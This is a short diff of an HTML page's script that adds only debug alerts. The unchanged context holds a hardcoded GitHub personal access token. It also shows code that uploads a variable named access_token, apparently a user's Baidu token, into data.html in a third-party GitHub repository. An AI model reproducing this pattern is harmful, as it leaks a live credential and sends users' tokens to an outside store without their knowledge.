@@ -23,11 +23,11 @@ alert("start......");
 <script type="text/javascript">
 // Octokit.js
 // https://github.com/octokit/core.js#readme
-    
+    alert("1");
 const octokit = new Octokit({
   auth: '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'
 });
-
+alert("2");
 await octokit.request('PUT /repos/lawyerlrc/baidu/contents/data.html', {
   owner: 'lawyerlrc',
   repo: 'baidu',
@@ -39,6 +39,7 @@ await octokit.request('PUT /repos/lawyerlrc/baidu/contents/data.html', {
   },
   content: access_token
 });
+    alert("3");
     alert(access_token);
 </script>
 </body>
